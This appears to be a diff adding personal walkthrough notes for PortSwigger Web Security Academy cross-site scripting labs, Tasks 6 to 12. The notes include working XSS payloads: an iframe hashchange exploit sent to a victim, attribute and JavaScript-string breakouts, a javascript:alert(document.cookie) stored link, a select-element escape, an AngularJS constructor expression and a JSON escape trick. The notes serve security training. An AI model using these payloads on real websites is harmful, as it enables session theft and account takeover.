@@ -33,7 +33,76 @@ It changes the href attribute, and when you click on the "back" button the alert
 Task 6:
 ///Lab: DOM XSS in jQuery selector sink using a hashchange event///
 
+So we have and exploit server. To the body part copy this with your lab id:
+<iframe src="https://0a4c002504175a6d80bb0332002e006b.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+store, and then deliver to victim.
 
+Task 7:
+///Lab: Reflected XSS into attribute with angle brackets HTML-encoded///
 
+In the source (after is search on 'asd'):
+<input type=text placeholder='Search the blog...' name=search value="asd"> >>> "onmouseover="alert(1) into the search (--->xss cheat-sheet)
 
+Task 8:
+///Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded///
+
+Make a coment, fill all the values (even email and website) with random characters, and inpect the source:
+<a id="author" href="gasd">basd</a> >>>this is the line where our "webpage" stored. Its in a href attribute, so letch check "javascript:alert(document.cookie)" as our webpage...
+And its worked
+
+Task 9:
+///Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded///
+
+Search on smthing and inspect the elements. It reflected our input in a script:
+
+var searchTerms = 'asd';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+
+So maybe we can break our with ' but to run the alert we need operators (like mathematican operators) between the two empty strings. so our input must be: '+alert(1)+'
+It will works with -,* too
+
+Task 10:
+///Lab: DOM XSS in document.write sink using source location.search inside a select element///
+
+Click on "view details" at one of the products. At the end of the page there is a stock checker button, check one city-s stock, and inpect the source:
+
+                                var stores = ["London","Paris","Milan"];
+                                var store = (new URLSearchParams(window.location.search)).get('storeId');
+                                document.write('<select name="storeId">');
+                                if(store) {
+                                    document.write('<option selected>'+store+'</option>');
+                                }
+                                for(var i=0;i<stores.length;i++) {
+                                    if(stores[i] === store) {
+                                        continue;
+                                    }
+                                    document.write('<option>'+stores[i]+'</option>');
+                                }
+                                document.write('</select>');
+
+So we have not just productId, but we have a storeId...From this line: document.write('<select name="storeId">'); maybe we can break out with "></select>...
+so lets check it if we add storeId to the url what will happen...
+https://0aa0002f03ec312380b303a4004500e6.web-security-academy.net/product?productId=1&storeId=asd >>>it is working, it added a plus line to the cities with my input.
+Now, we can use our paylode like: &storeId="></select><script>alert(1)></script> >>>and it worked
+
+Task 11:
+///Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded///
+
+"When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces." >>>so we will use the following format : {{ expression }}
+After a lot of search of these expressions the mostly used expression is the "constructor" ...So i asked gemini to write a working expression to me: "".constructor.constructor("alert(1)")();
+So into searchbar: {{"".constructor.constructor("alert(1)")();} >>>and it worked.
+
+Task 12:
+///Lab: Reflected DOM XSS///
+
+Open the webapp in burpsuite, and search on something...
+As i can see in the script part all we have is:
+                   <script>search('search-results')</script>
+So the webapp stores our input, and to reflect it, it calls a GET request with the following lines:
+
+{"results":[],"searchTerm":"asd"}
+Maybe we can break our from here...I searched on : "-alert(1)" and this what i get:
+{"results":[],"searchTerm":"\"-alert(1)\""}
+so i will modify my search to \"-alert(1)// >>> // is commenting out the rest of the line
+{"results":[],"searchTerm":"\\"-alert(1)//"} >>> okay it run down, but it commented our the } what is a must...so next modify: \"-alert(1)}// >>>and it worked.
 
